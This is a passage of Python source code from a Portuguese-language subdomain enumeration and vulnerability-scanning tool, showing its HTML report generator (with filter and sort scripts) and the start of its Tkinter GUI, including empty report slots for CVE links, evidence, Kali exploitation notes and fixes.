            f.write(f"# Total: {len(subdomains)} subdomínios\n")
            f.write(f"{'#' * 70}\n\n")
            for sub in sorted(subdomains.keys()):
                info = subdomains[sub]
                ip = info.get('ip', '')
                status = info.get('status', '')
                source = info.get('source', '')
                line = sub
                if ip:
                    line += f" | {ip}"
                if status:
                    line += f" | HTTP {status}"
                line += f" | [{source}]"
                f.write(line + '\n')

    @staticmethod
    def save_html(subdomains, filepath, domain, vulnerabilities=None):
        """Relatório HTML: subdomínios primeiro, vulnerabilidades por último."""
        vulnerabilities = vulnerabilities or []
        gen_date = datetime.now().strftime('%d/%m/%Y %H:%M:%S')
        resolved = sum(1 for v in subdomains.values() if v.get('ip'))
        active_http = sum(1 for v in subdomains.values() if v.get('status'))

        sources_count = {}
        for info in subdomains.values():
            src = info.get('source', 'Desconhecida')
            sources_count[src] = sources_count.get(src, 0) + 1

        status_count = {}
        for info in subdomains.values():
            st = info.get('status', '')
            if st:
                status_count[st] = status_count.get(st, 0) + 1
        all_statuses = sorted(status_count.keys())

        def esc(s):
            return html_mod.escape(str(s), quote=True)

        sev_colors = {'CRITICAL': '#e84393', 'HIGH': '#e17055',
                      'MEDIUM': '#fdcb6e', 'LOW': '#b2bec3', 'INFO': '#74b9ff'}
        sev_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2,
                     'LOW': 3, 'INFO': 4}
        vulns_sorted = sorted(vulnerabilities,
                              key=lambda v: sev_order.get(v['severity'], 9))

        vuln_html = ""
        for i, v in enumerate(vulns_sorted, 1):
            color = sev_colors.get(v['severity'], '#b2bec3')
            vuln_html += f"""
<div style="background:#1e1e3a;border-radius:14px;padding:20px;margin-bottom:16px;
            border-left:6px solid {color};">
  <div style="display:flex;align-items:center;gap:12px;flex-wrap:wrap;">
    <span style="background:{color}22;color:{color};padding:4px 14px;
                 border-radius:20px;font-weight:800;font-size:0.8em;">
      {esc(v['severity'])}</span>
    <h3 style="font-size:1.05em;">{i}. {esc(v['name'])}</h3>
    <span style="margin-left:auto;color:#74b9ff;font-family:monospace;
                 font-size:0.85em;">{esc(v.get('host',''))}</span>
  </div>
  <p style="color:#888;font-size:0.85em;margin:8px 0;">
    {esc(v.get('cve',''))} —
    <a href="{esc(v.get('cve_url',''))}" target="_blank"
       style="color:#667eea;">{esc(v.get('cve_url',''))}</a></p>
  <p style="margin-top:10px;"><b>🔍 Evidência:</b></p>
  <pre style="background:#0a0a1a;padding:12px;border-radius:8px;
              white-space:pre-wrap;word-break:break-word;font-size:0.85em;">{esc(v.get('evidence',''))}</pre>
  <p style="margin-top:10px;"><b style="color:#e17055;">💥 Exploração com Kali Linux:</b></p>
  <pre style="background:#0a0a1a;padding:12px;border-radius:8px;
              border-left:3px solid #e17055;
              white-space:pre-wrap;word-break:break-word;font-size:0.85em;">{esc(v.get('kali',''))}</pre>
  <p style="margin-top:10px;"><b style="color:#00b894;">🛠 Correção:</b></p>
  <pre style="background:#0a0a1a;padding:12px;border-radius:8px;
              border-left:3px solid #00b894;
              white-space:pre-wrap;word-break:break-word;font-size:0.85em;">{esc(v.get('fix',''))}</pre>
</div>"""
        if not vuln_html:
            vuln_html = ("<p style='text-align:center;padding:40px;"
                         "color:#00b894;'>✅ Nenhuma vulnerabilidade "
                         "encontrada.</p>")

        html_doc = f"""<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>SubFinder - {esc(domain)}</title>
<style>
* {{ margin:0; padding:0; box-sizing:border-box; }}
body {{
    font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;
    background:linear-gradient(135deg,#0c0c1d,#1a1a2e,#16213e);
    color:#e0e0e0; min-height:100vh;
}}
.container {{ max-width:1500px; margin:0 auto; padding:20px; }}
.header {{
    text-align:center; padding:40px 20px;
    background:linear-gradient(135deg,#667eea,#764ba2);
    border-radius:20px; margin-bottom:30px;
    box-shadow:0 20px 60px rgba(102,126,234,0.3);
}}
.header h1 {{ font-size:2.5em; color:white;
    text-shadow:2px 2px 4px rgba(0,0,0,0.3); }}
.header .subtitle {{ color:rgba(255,255,255,0.8);
    font-size:1.1em; margin-top:5px; }}
.domain-badge {{
    display:inline-block; background:rgba(255,255,255,0.2);
    backdrop-filter:blur(10px);
    border:1px solid rgba(255,255,255,0.3);
    padding:10px 30px; border-radius:50px;
    font-size:1.3em; font-weight:700;
    color:white; margin-top:15px;
}}
.gen-date {{ color:rgba(255,255,255,0.6);
    font-size:0.85em; margin-top:10px; }}
.stats-grid {{
    display:grid;
    grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
    gap:20px; margin-bottom:30px;
}}
.stat-card {{
    background:linear-gradient(145deg,#1e1e3a,#2a2a4a);
    border-radius:16px; padding:25px; text-align:center;
    border:1px solid rgba(255,255,255,0.05);
    box-shadow:0 8px 32px rgba(0,0,0,0.3);
    transition:transform 0.2s;
}}
.stat-card:hover {{ transform:translateY(-3px); }}
.stat-card .number {{
    font-size:2.5em; font-weight:800;
    background:linear-gradient(135deg,#667eea,#764ba2);
    -webkit-background-clip:text;
    -webkit-text-fill-color:transparent;
}}
.stat-card.green .number {{
    background:linear-gradient(135deg,#00b894,#00cec9);
    -webkit-background-clip:text;
    -webkit-text-fill-color:transparent;
}}
.stat-card.orange .number {{
    background:linear-gradient(135deg,#fdcb6e,#e17055);
    -webkit-background-clip:text;
    -webkit-text-fill-color:transparent;
}}
.stat-card.red .number {{
    background:linear-gradient(135deg,#fd79a8,#e84393);
    -webkit-background-clip:text;
    -webkit-text-fill-color:transparent;
}}
.stat-card .label {{
    font-size:0.9em; color:#888; margin-top:5px;
    text-transform:uppercase; letter-spacing:1px;
}}
.sources-section {{
    background:linear-gradient(145deg,#1e1e3a,#2a2a4a);
    border-radius:16px; padding:25px; margin-bottom:25px;
    border:1px solid rgba(255,255,255,0.05);
}}
.sources-section h2 {{
    font-size:1.3em; margin-bottom:15px; color:#667eea;
}}
.sources-list {{ display:flex; flex-wrap:wrap; gap:10px; }}
.source-badge {{
    display:inline-flex; align-items:center; gap:8px;
    background:rgba(102,126,234,0.1);
    border:1px solid rgba(102,126,234,0.3);
    padding:8px 16px; border-radius:25px; font-size:0.9em;
}}
.source-badge .cnt {{
    background:rgba(102,126,234,0.3); padding:2px 8px;
    border-radius:12px; font-weight:700; font-size:0.85em;
}}
.filter-bar {{
    background:linear-gradient(145deg,#1e1e3a,#2a2a4a);
    border-radius:16px; padding:20px 25px; margin-bottom:25px;
    border:1px solid rgba(255,255,255,0.05);
}}
.filter-bar h3 {{
    color:#667eea; font-size:1.1em; margin-bottom:15px;
}}
.filter-row {{
    display:flex; flex-wrap:wrap; align-items:center;
    gap:12px; margin-bottom:12px;
}}
.filter-row:last-child {{ margin-bottom:0; }}
.filter-row label {{ color:#aaa; font-size:0.9em; }}
.search-input {{
    flex:1; min-width:250px; padding:10px 16px;
    border:2px solid rgba(102,126,234,0.3);
    border-radius:10px; background:rgba(12,12,29,0.8);
    color:#e0e0e0; font-size:1em; outline:none;
    transition:border-color 0.3s;
}}
.search-input:focus {{
    border-color:#667eea;
}}
.cb-group {{ display:flex; flex-wrap:wrap; gap:8px; }}
.cb-btn {{
    display:inline-flex; align-items:center; gap:6px;
    padding:7px 14px; border-radius:25px;
    border:2px solid rgba(255,255,255,0.1);
    background:rgba(255,255,255,0.03);
    color:#999; font-size:0.85em; font-weight:600;
    cursor:pointer; transition:all 0.25s;
    user-select:none;
}}
.cb-btn:hover {{
    border-color:rgba(255,255,255,0.25);
    background:rgba(255,255,255,0.06);
}}
.cb-btn.active {{
    border-color:var(--btn-color,#667eea);
    background:var(--btn-bg,rgba(102,126,234,0.15));
    color:var(--btn-color,#667eea);
}}
.cb-btn .dot {{
    width:8px; height:8px; border-radius:50%;
    background:currentColor;
}}
.cb-btn .count {{
    opacity:0.7; font-size:0.8em;
}}
.filter-counter {{
    text-align:right; color:#888; font-size:0.85em;
    padding:8px 0;
}}
.table-container {{
    background:linear-gradient(145deg,#1e1e3a,#2a2a4a);
    border-radius:16px; overflow:hidden;
    border:1px solid rgba(255,255,255,0.05);
    box-shadow:0 8px 32px rgba(0,0,0,0.3);
    margin-bottom:30px;
}}
table {{ width:100%; border-collapse:collapse; }}
thead {{
    background:linear-gradient(135deg,#667eea,#764ba2);
}}
th {{
    padding:14px 18px; text-align:left; font-weight:600;
    color:white; text-transform:uppercase; font-size:0.8em;
    letter-spacing:1px; cursor:pointer;
    transition:background 0.2s;
}}
th:hover {{ background:rgba(255,255,255,0.1); }}
th .sort-arrow {{ opacity:0.5; margin-left:5px; }}
td {{
    padding:12px 18px;
    border-bottom:1px solid rgba(255,255,255,0.03);
    font-size:0.9em;
}}
tr {{ transition:background 0.15s; }}
tr:hover {{ background:rgba(102,126,234,0.08); }}
.subdomain-cell {{
    font-family:'Consolas','Courier New',monospace;
    color:#74b9ff; font-weight:500;
}}
.ip-cell {{
    font-family:'Consolas','Courier New',monospace;
    color:#a29bfe;
}}
.no-data {{ color:#444; }}
.status-badge {{
    display:inline-block; padding:4px 12px;
    border-radius:20px; font-size:0.8em; font-weight:700;
    letter-spacing:0.5px;
}}
.st-2xx {{ background:rgba(0,184,148,0.2); color:#00b894; }}
.st-3xx {{ background:rgba(253,203,110,0.2); color:#fdcb6e; }}
.st-4xx {{ background:rgba(225,112,85,0.2); color:#e17055; }}
.st-5xx {{ background:rgba(253,121,168,0.2); color:#fd79a8; }}
.st-other {{ background:rgba(178,190,195,0.2); color:#b2bec3; }}
.source-tag {{
    display:inline-block;
    background:rgba(162,155,254,0.15);
    color:#a29bfe; padding:3px 10px;
    border-radius:15px; font-size:0.75em;
}}
.footer {{
    text-align:center; padding:30px; color:#444;
    font-size:0.85em; margin-top:20px;
}}
.footer strong {{ color:#667eea; }}
</style>
</head>
<body>
<div class="container">

<div class="header">
    <h1>🔍 SubFinder Relatório de Enumeração de Subdomínios + Vulnerabilidades</h1>
    <p class="subtitle">Relatório de Enumeração de Subdomínios + Vulnerabilidades</p>
    <div class="domain-badge">🌐 {esc(domain)}</div>
    <p class="gen-date">Gerado em {gen_date}</p>
</div>

<div class="stats-grid">
    <div class="stat-card">
        <div class="number">{len(subdomains)}</div>
        <div class="label">Total Subdomínios</div>
    </div>
    <div class="stat-card green">
        <div class="number">{resolved}</div>
        <div class="label">IPs Resolvidos</div>
    </div>
    <div class="stat-card orange">
        <div class="number">{active_http}</div>
        <div class="label">HTTP Ativos</div>
    </div>
    <div class="stat-card red">
        <div class="number">{len(vulnerabilities)}</div>
        <div class="label">Vulnerabilidades</div>
    </div>
</div>

<div class="sources-section">
    <h2>📡 Fontes de Dados</h2>
    <div class="sources-list">"""

        for src, cnt in sorted(
            sources_count.items(), key=lambda x: x[1], reverse=True
        ):
            html_doc += (
                f'<div class="source-badge">{esc(src)}'
                f'<span class="cnt">{cnt}</span></div>\n'
            )

        html_doc += """
    </div>
</div>

<div class="filter-bar">
    <h3>🎯 Filtros</h3>
    <div class="filter-row">
        <label>🔍 Buscar:</label>
        <input type="text" class="search-input" id="searchInput"
               placeholder="Filtrar por subdomínio, IP, fonte..."
               oninput="applyFilters()">
    </div>
    <div class="filter-row">
        <label>📊 Status HTTP:</label>
        <div class="cb-group" id="statusFilters">
            <div class="cb-btn active"
                 style="--btn-color:#667eea;--btn-bg:rgba(102,126,234,0.15);"
                 data-filter="all" onclick="toggleFilter(this)">
                <span class="dot"></span>
                Todos
                <span class="count">(""" + str(len(subdomains)) + """)</span>
            </div>"""

        status_colors = {
            '200': ('#00b894', 'rgba(0,184,148,0.15)'),
            '201': ('#00b894', 'rgba(0,184,148,0.15)'),
            '301': ('#fdcb6e', 'rgba(253,203,110,0.15)'),
            '302': ('#ffeaa7', 'rgba(255,234,167,0.15)'),
            '307': ('#fab1a0', 'rgba(250,177,160,0.15)'),
            '308': ('#fab1a0', 'rgba(250,177,160,0.15)'),
            '400': ('#e17055', 'rgba(225,112,85,0.15)'),
            '401': ('#e17055', 'rgba(225,112,85,0.15)'),
            '403': ('#e17055', 'rgba(225,112,85,0.15)'),
            '404': ('#d63031', 'rgba(214,48,49,0.15)'),
            '500': ('#fd79a8', 'rgba(253,121,168,0.15)'),
            '502': ('#fd79a8', 'rgba(253,121,168,0.15)'),
            '503': ('#fd79a8', 'rgba(253,121,168,0.15)'),
        }
        default_color = ('#b2bec3', 'rgba(178,190,195,0.15)')

        status_labels = {
            '200': '200 OK', '201': '201 Created',
            '301': '301 Moved', '302': '302 Found',
            '307': '307 Redirect', '308': '308 Permanent',
            '400': '400 Bad Request', '401': '401 Unauthorized',
            '403': '403 Forbidden', '404': '404 Not Found',
            '500': '500 Error', '502': '502 Bad Gateway',
            '503': '503 Unavailable',
        }

        for st in all_statuses:
            color, bg = status_colors.get(st, default_color)
            label = status_labels.get(st, f'{st}')
            cnt = status_count[st]
            html_doc += f"""
            <div class="cb-btn"
                 style="--btn-color:{color};--btn-bg:{bg};"
                 data-filter="{esc(st)}" onclick="toggleFilter(this)">
                <span class="dot"></span>
                {esc(label)}
                <span class="count">({cnt})</span>
            </div>"""

        no_ip_count = sum(
            1 for v in subdomains.values() if not v.get('ip')
        )
        no_status_count = sum(
            1 for v in subdomains.values()
            if v.get('ip') and not v.get('status')
        )

        html_doc += f"""
            <div class="cb-btn"
                 style="--btn-color:#636e72;--btn-bg:rgba(99,110,114,0.15);"
                 data-filter="no_ip" onclick="toggleFilter(this)">
                <span class="dot"></span>
                Sem IP
                <span class="count">({no_ip_count})</span>
            </div>
            <div class="cb-btn"
                 style="--btn-color:#b2bec3;--btn-bg:rgba(178,190,195,0.15);"
                 data-filter="no_status" onclick="toggleFilter(this)">
                <span class="dot"></span>
                Sem Status
                <span class="count">({no_status_count})</span>
            </div>
        </div>
    </div>

    <div class="filter-counter" id="filterCounter">
        Mostrando {len(subdomains)} de {len(subdomains)} subdomínios
    </div>
</div>

<!-- ===== TABELA DE SUBDOMÍNIOS (antes das vulnerabilidades) ===== -->
<div class="table-container">
    <table id="resultsTable">
        <thead>
            <tr>
                <th onclick="sortTable(0)">#
                    <span class="sort-arrow">⇅</span></th>
                <th onclick="sortTable(1)">Subdomínio
                    <span class="sort-arrow">⇅</span></th>
                <th onclick="sortTable(2)">IP
                    <span class="sort-arrow">⇅</span></th>
                <th onclick="sortTable(3)">HTTP Status
                    <span class="sort-arrow">⇅</span></th>
                <th onclick="sortTable(4)">Fonte
                    <span class="sort-arrow">⇅</span></th>
            </tr>
        </thead>
        <tbody>"""

        for idx, (sub, info) in enumerate(
            sorted(subdomains.items()), 1
        ):
            ip = info.get('ip', '')
            status = info.get('status', '')
            source = info.get('source', '')

            ip_html = (
                f'<span class="ip-cell">{esc(ip)}</span>'
                if ip else '<span class="no-data">—</span>'
            )

            if status:
                first_digit = status[0] if status else ''
                st_class = f"st-{first_digit}xx"
                if first_digit not in ('2', '3', '4', '5'):
                    st_class = "st-other"
                status_html = (
                    f'<span class="status-badge {st_class}">'
                    f'{esc(status)}</span>'
                )
            else:
                status_html = '<span class="no-data">—</span>'

            html_doc += f"""
            <tr data-sub="{esc(sub)}" data-ip="{esc(ip)}"
                data-status="{esc(status)}" data-source="{esc(source)}">
                <td>{idx}</td>
                <td class="subdomain-cell">{esc(sub)}</td>
                <td>{ip_html}</td>
                <td>{status_html}</td>
                <td><span class="source-tag">{esc(source)}</span></td>
            </tr>"""

        html_doc += """
        </tbody>
    </table>
</div>

<!-- ===== VULNERABILIDADES (por último) ===== -->
"""

        # FIX CRÍTICO: f-string para interpolar {vuln_html}
        html_doc += f"""
<div class="sources-section">
    <h2>🚨 Vulnerabilidades Encontradas ({len(vulnerabilities)})</h2>
    {vuln_html}
</div>

<div class="footer">
    <p>Gerado por <strong>SubFinder</strong> —
       Ferramenta de Enumeração de Subdomínios + Análise de Vulnerabilidades</p>
    <p>🐍 Desenvolvido em Python</p>
</div>

</div><!-- /container -->

<script>
const totalRows = document.querySelectorAll(
    '#resultsTable tbody tr'
).length;

let activeFilters = new Set(['all']);

function toggleFilter(btn) {{
    const filter = btn.dataset.filter;

    if (filter === 'all') {{
        activeFilters.clear();
        activeFilters.add('all');
        document.querySelectorAll('.cb-btn').forEach(b => {{
            b.classList.remove('active');
        }});
        btn.classList.add('active');
    }} else {{
        activeFilters.delete('all');
        document.querySelector(
            '.cb-btn[data-filter="all"]'
        ).classList.remove('active');

        if (activeFilters.has(filter)) {{
            activeFilters.delete(filter);
            btn.classList.remove('active');
        }} else {{
            activeFilters.add(filter);
            btn.classList.add('active');
        }}

        if (activeFilters.size === 0) {{
            activeFilters.add('all');
            document.querySelector(
                '.cb-btn[data-filter="all"]'
            ).classList.add('active');
        }}
    }}

    applyFilters();
}}

function applyFilters() {{
    const searchText = document.getElementById(
        'searchInput'
    ).value.toLowerCase();

    const rows = document.querySelectorAll(
        '#resultsTable tbody tr'
    );
    const showAll = activeFilters.has('all');

    let visible = 0;
    let counter = 1;

    rows.forEach(row => {{
        const sub = (row.dataset.sub || '').toLowerCase();
        const ip = (row.dataset.ip || '').toLowerCase();
        const status = row.dataset.status || '';
        const source = (row.dataset.source || '').toLowerCase();

        let textMatch = true;
        if (searchText) {{
            const combined = sub + ' ' + ip + ' '
                + status + ' ' + source;
            textMatch = combined.includes(searchText);
        }}

        let statusMatch = false;
        if (showAll) {{
            statusMatch = true;
        }} else {{
            for (const f of activeFilters) {{
                if (f === 'no_ip' && !row.dataset.ip) {{
                    statusMatch = true;
                    break;
                }}
                if (f === 'no_status'
                    && row.dataset.ip && !status) {{
                    statusMatch = true;
                    break;
                }}
                if (status === f) {{
                    statusMatch = true;
                    break;
                }}
            }}
        }}

        if (textMatch && statusMatch) {{
            row.style.display = '';
            row.cells[0].textContent = counter;
            counter++;
            visible++;
        }} else {{
            row.style.display = 'none';
        }}
    }});

    document.getElementById('filterCounter').textContent =
        'Mostrando ' + visible + ' de ' + totalRows
        + ' subdomínios';
}}

let sortState = {{}};

function sortTable(colIndex) {{
    const tbody = document.querySelector(
        '#resultsTable tbody'
    );
    const rows = Array.from(tbody.querySelectorAll('tr'));

    sortState[colIndex] = !sortState[colIndex];
    const dir = sortState[colIndex] ? 1 : -1;

    rows.sort((a, b) => {{
        let aVal, bVal;
        if (colIndex === 0) {{
            aVal = a.dataset.sub || '';
            bVal = b.dataset.sub || '';
        }} else if (colIndex === 1) {{
            aVal = a.dataset.sub || '';
            bVal = b.dataset.sub || '';
        }} else if (colIndex === 2) {{
            aVal = a.dataset.ip || '';
            bVal = b.dataset.ip || '';
            if (aVal && bVal) {{
                const aParts = aVal.split('.').map(Number);
                const bParts = bVal.split('.').map(Number);
                for (let i = 0; i < 4; i++) {{
                    if ((aParts[i]||0) !== (bParts[i]||0)) {{
                        return ((aParts[i]||0)
                            - (bParts[i]||0)) * dir;
                    }}
                }}
                return 0;
            }}
            if (!aVal && bVal) return 1 * dir;
            if (aVal && !bVal) return -1 * dir;
            return 0;
        }} else if (colIndex === 3) {{
            aVal = a.dataset.status || '';
            bVal = b.dataset.status || '';
        }} else {{
            aVal = a.dataset.source || '';
            bVal = b.dataset.source || '';
        }}
        return aVal.localeCompare(bVal) * dir;
    }});

    rows.forEach(row => tbody.appendChild(row));
    applyFilters();
}}
</script>
</body>
</html>"""

        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html_doc)


# ============================================================
# INTERFACE GRÁFICA
# ============================================================

class SubFinderGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("SubFinder Pro — Enumeração + Vulnerabilidades")
        self.root.geometry("1200x850")
        self.root.minsize(900, 600)
        self.enumerator = None
        self.scanner = None
        self.results = {}
        self.vulnerabilities = []
        self.is_running = False
        self.current_domain = ""
        self.tree_items = {}
        self.sort_reverse = {}
        self.vuln_var = tk.BooleanVar(value=True)
        self.setup_theme()
        self.create_widgets()

    def setup_theme(self):
        self.colors = {
            'bg': '#0c0c1d', 'bg2': '#1a1a2e', 'bg3': '#16213e',
            'fg': '#e0e0e0', 'accent': '#667eea', 'accent2': '#764ba2',
            'green': '#00b894', 'red': '#e17055', 'orange': '#fdcb6e',
            'blue': '#74b9ff', 'purple': '#a29bfe', 'border': '#2a2a4a'
        }
        self.root.configure(bg=self.colors['bg'])
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TFrame', background=self.colors['bg'])
        style.configure(
            'TLabel', background=self.colors['bg'],
            foreground=self.colors['fg'], font=('Segoe UI', 10)
        )
        style.configure(
            'Title.TLabel', font=('Segoe UI', 24, 'bold'),
            foreground=self.colors['accent']
        )
        style.configure(
            'Subtitle.TLabel', font=('Segoe UI', 11),
            foreground='#888888'
        )
        style.configure('TNotebook', background=self.colors['bg'])
        style.configure(
            'TNotebook.Tab', background=self.colors['bg2'],
            foreground=self.colors['fg'],
            padding=(15, 8), font=('Segoe UI', 10)
        )
        style.map(
            'TNotebook.Tab',
            background=[('selected', self.colors['accent'])],
            foreground=[('selected', 'white')]
        )
        style.configure(
            'Treeview', background=self.colors['bg2'],
            foreground=self.colors['fg'],
            fieldbackground=self.colors['bg2'],
            rowheight=28, font=('Consolas', 10)
        )
        style.configure(
            'Treeview.Heading', background=self.colors['accent'],
            foreground='white', font=('Segoe UI', 10, 'bold')
        )
        style.map(
            'Treeview',
            background=[('selected', self.colors['accent'])],
            foreground=[('selected', 'white')]
        )
        style.configure(
            "Custom.Horizontal.TProgressbar",
            background=self.colors['accent'],
            troughcolor=self.colors['bg2'], thickness=22
        )

    def create_widgets(self):
        main = ttk.Frame(self.root)
        main.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)

        # HEADER
        header_frame = ttk.Frame(main)
        header_frame.pack(fill=tk.X, pady=(0, 15))
        ttk.Label(
            header_frame, text="🔍 SubFinder Pro", style='Title.TLabel'
        ).pack(side=tk.LEFT)
        ttk.Label(
            header_frame, text="Enumeração + Vulnerabilidades + CVE + Kali",
            style='Subtitle.TLabel'
        ).pack(side=tk.LEFT, padx=(15, 0))

        # INPUT
        input_frame = tk.Frame(
            main, bg=self.colors['bg2'],
            highlightbackground=self.colors['border'],
            highlightthickness=1
        )
        input_frame.pack(fill=tk.X, pady=(0, 10))
        inner = tk.Frame(input_frame, bg=self.colors['bg2'])
        inner.pack(fill=tk.X, padx=15, pady=12)

        tk.Label(
            inner, text="Domínio Alvo:",
            bg=self.colors['bg2'], fg=self.colors['fg'],
            font=('Segoe UI', 11, 'bold')
        ).pack(side=tk.LEFT)

        self.domain_var = tk.StringVar()
        self.domain_entry = tk.Entry(
            inner, textvariable=self.domain_var,
            font=('Consolas', 13), bg=self.colors['bg3'],
            fg=self.colors['blue'],
            insertbackground=self.colors['blue'],
            relief=tk.FLAT, bd=8, width=35
        )
        self.domain_entry.pack(side=tk.LEFT, padx=(10, 15))
        self.domain_entry.bind('<Return>', lambda e: self.start_scan())

        self.start_btn = tk.Button(
            inner, text="▶  INICIAR", font=('Segoe UI', 11, 'bold'),
            bg=self.colors['accent'], fg='white',
            activebackground=self.colors['accent2'],
            relief=tk.FLAT, bd=0, padx=20, pady=8,
            command=self.start_scan
        )
        self.start_btn.pack(side=tk.LEFT, padx=(0, 8))

        self.stop_btn = tk.Button(
            inner, text="⏹  PARAR", font=('Segoe UI', 11, 'bold'),
            bg=self.colors['red'], fg='white',
            activebackground='#d63031',
            relief=tk.FLAT, bd=0, padx=20, pady=8,
            command=self.stop_scan, state=tk.DISABLED
        )
        self.stop_btn.pack(side=tk.LEFT, padx=(0, 8))

        self.resolve_var = tk.BooleanVar(value=True)
        self.http_var = tk.BooleanVar(value=True)
        opts = tk.Frame(inner, bg=self.colors['bg2'])
        opts.pack(side=tk.LEFT, padx=(10, 0))
        for text, var in [
            ("Resolver DNS", self.resolve_var),
            ("Verificar HTTP", self.http_var),
            ("Analisar Vulnerabilidades", self.vuln_var),
        ]:
            tk.Checkbutton(
                opts, text=text, variable=var,
                bg=self.colors['bg2'], fg=self.colors['fg'],
                selectcolor=self.colors['bg3'],
                activebackground=self.colors['bg2'],
                activeforeground=self.colors['fg']
            ).pack(anchor=tk.W)

        # STATS
        stats_f = tk.Frame(main, bg=self.colors['bg'])
        stats_f.pack(fill=tk.X, pady=(0, 10))
        self.stat_labels = {}
        for key, label, color in [
            ('total', 'Total', self.colors['accent']),
            ('resolved', 'Resolvidos', self.colors['green']),
            ('vulns', 'Vulnerabilidades', '#e84393'),
            ('crit', 'Críticas', '#e84393'),
        ]:
            card = tk.Frame(
                stats_f, bg=self.colors['bg2'],
                highlightbackground=self.colors['border'],
                highlightthickness=1
            )
            card.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
            nl = tk.Label(
                card, text="0", font=('Segoe UI', 24, 'bold'),
                bg=self.colors['bg2'], fg=color
            )
            nl.pack(pady=(8, 0))
            tk.Label(
                card, text=label, font=('Segoe UI', 9),
                bg=self.colors['bg2'], fg='#888888'
            ).pack(pady=(0, 8))
            self.stat_labels[key] = nl

        # PROGRESS
        pf = tk.Frame(main, bg=self.colors['bg'])
        pf.pack(fill=tk.X, pady=(0, 5))
        self.progress = ttk.Progressbar(
            pf, mode='determinate',
            style="Custom.Horizontal.TProgressbar", maximum=100
        )
        self.progress.pack(fill=tk.X, side=tk.LEFT, expand=True)
        self.progress['value'] = 0
        self.progress_label = tk.Label(
            pf, text="0%", font=('Segoe UI', 10, 'bold'),
            bg=self.colors['bg'], fg=self.colors['accent'], width=6
        )
        self.progress_label.pack(side=tk.RIGHT, padx=(8, 0))
        self.progress_detail = tk.Label(
            main, text="Aguardando...", font=('Segoe UI', 9),
            bg=self.colors['bg'], fg='#888'
        )
        self.progress_detail.pack(fill=tk.X, pady=(0, 5))

        # NOTEBOOK
        self.notebook = ttk.Notebook(main)
        self.notebook.pack(fill=tk.BOTH, expand=True)

        # Console Tab
        console_f = ttk.Frame(self.notebook)
        self.notebook.add(console_f, text="  📋 Console  ")
        self.console = scrolledtext.ScrolledText(
            console_f, font=('Consolas', 10), bg='#0a0a1a',
            fg=self.colors['fg'], relief=tk.FLAT, bd=10, wrap=tk.WORD
        )
        self.console.pack(fill=tk.BOTH, expand=True)
        for tag, color, font in [
            ('header', self.colors['accent'],
             ('Consolas', 10, 'bold')),
            ('source', self.colors['orange'], ('Consolas', 10)),
            ('found', self.colors['green'], ('Consolas', 10)),
            ('success', '#00cec9', ('Consolas', 10, 'bold')),
            ('error', self.colors['red'], ('Consolas', 10)),
            ('warning', '#fdcb6e', ('Consolas', 10)),
            ('info', '#b2bec3', ('Consolas', 10)),
            ('vuln', '#e84393', ('Consolas', 10, 'bold')),
        ]:
            self.console.tag_config(tag, foreground=color, font=font)

        # Aba Vulnerabilidades
        vuln_f = ttk.Frame(self.notebook)
        self.notebook.add(vuln_f, text="  🚨 Vulnerabilidades  ")

        vtree_f = ttk.Frame(vuln_f)
        vtree_f.pack(fill=tk.BOTH, expand=True, pady=(5, 0))
        vcols = ('sev', 'host', 'name', 'cve', 'kali_tool')
        self.vuln_tree = ttk.Treeview(
            vtree_f, columns=vcols, show='headings', selectmode='browse'
        )
        for cid, text, w in [
            ('sev', 'Severidade', 110),
            ('host', 'Host', 220),
            ('name', 'Vulnerabilidade', 420),
            ('cve', 'CVE / CWE', 180),
            ('kali_tool', 'Ferramenta (Kali)', 400),
        ]:
            self.vuln_tree.heading(cid, text=text)
            self.vuln_tree.column(cid, width=w)
        self.vuln_tree.tag_configure('CRITICAL', foreground='#e84393')
        self.vuln_tree.tag_configure('HIGH', foreground='#e17055')
        self.vuln_tree.tag_configure('MEDIUM', foreground='#fdcb6e')
        self.vuln_tree.tag_configure('LOW', foreground='#b2bec3')
        self.vuln_tree.tag_configure('INFO', foreground='#74b9ff')

        vsb = ttk.Scrollbar(vtree_f, orient=tk.VERTICAL,
                            command=self.vuln_tree.yview)
        self.vuln_tree.configure(yscrollcommand=vsb.set)
        self.vuln_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        vsb.pack(side=tk.RIGHT, fill=tk.Y)
        self.vuln_tree.bind('<Double-1>', self.show_vuln_detail)

        tk.Label(
            vuln_f,
            text="Duplo clique para ver: evidência, PoC de exploração "
                 "(Kali Linux), correção e link do CVE",
            font=('Segoe UI', 9), bg=self.colors['bg'], fg='#888'
        ).pack(anchor=tk.W, pady=3)

        # Results Tab
        results_f = ttk.Frame(self.notebook)
        self.notebook.add(results_f, text="  📊 Resultados  ")

        filter_main = tk.Frame(results_f, bg=self.colors['bg'])
        filter_main.pack(fill=tk.X, pady=5)

        fr1 = tk.Frame(filter_main, bg=self.colors['bg'])
        fr1.pack(fill=tk.X, pady=(0, 5))
        tk.Label(
            fr1, text="🔍 Filtrar:", bg=self.colors['bg'],
            fg=self.colors['fg'], font=('Segoe UI', 10)
        ).pack(side=tk.LEFT, padx=(5, 5))
        self.filter_var = tk.StringVar()
        self.filter_var.trace('w', lambda *a: self.apply_filters())
        tk.Entry(
            fr1, textvariable=self.filter_var, font=('Consolas', 11),
            bg=self.colors['bg3'], fg=self.colors['fg'],
            insertbackground=self.colors['fg'],
            relief=tk.FLAT, bd=5, width=40
        ).pack(side=tk.LEFT, padx=5)

        fr2 = tk.Frame(
            filter_main, bg=self.colors['bg2'],
            highlightbackground=self.colors['border'],
            highlightthickness=1
        )
        fr2.pack(fill=tk.X, pady=(0, 5), padx=5)
        fi = tk.Frame(fr2, bg=self.colors['bg2'])
        fi.pack(fill=tk.X, padx=10, pady=8)

        tk.Label(
            fi, text="📊 Status HTTP:",
            bg=self.colors['bg2'], fg=self.colors['fg'],
            font=('Segoe UI', 10, 'bold')
        ).pack(side=tk.LEFT, padx=(0, 15))

        self.status_filters = {}
        for code, label, color in [
            ('all', 'Todos', self.colors['accent']),
            ('200', '200 OK', self.colors['green']),
